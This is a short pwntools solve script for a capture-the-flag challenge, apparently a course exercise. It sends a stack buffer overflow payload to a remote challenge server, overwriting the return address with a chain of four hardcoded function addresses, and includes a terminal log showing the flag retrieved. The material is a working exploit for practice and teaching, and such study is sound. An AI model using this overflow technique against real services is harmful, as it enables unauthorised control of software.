from pwn import * 

#p = process("./file")
p = remote("chal.firebird.sh", 35034)
s = 'b * vuln+141'
#gdb.attach(p, s)
p.recvuntil(b"What are the magic words?\nanswer correctly, and i\'ll give you the flag!\n")

pause()
payload = flat(
    b'A' * 0x60, # to rbp
    b'B' * 0x8, # to return address
    p64(0x00000000004006f6), # win1
    p64(0x0000000000400711),
    p64(0x000000000040072c),
    p64(0x0000000000400747)
)
p.sendline(payload)
pause()
p.interactive()


'''
┌──(kali㉿kali)-[~/Desktop/CTF/7a_attendance]
└─$ python solve.py
[+] Opening connection to chal.firebird.sh on port 35034: Done
[*] Paused (press any to continue)
[*] Paused (press any to continue)
[*] Switching to interactive mode

haha!!

ok, calm down...

Alright...

What are the magic words?
answer correctly, and i'll give you the flag!

$ a
flag{W33k7_4lr3dy_UwU_pl3a53_d0_week7_h0mew0rk_UwU}
[*] Got EOF while reading in interactive
'''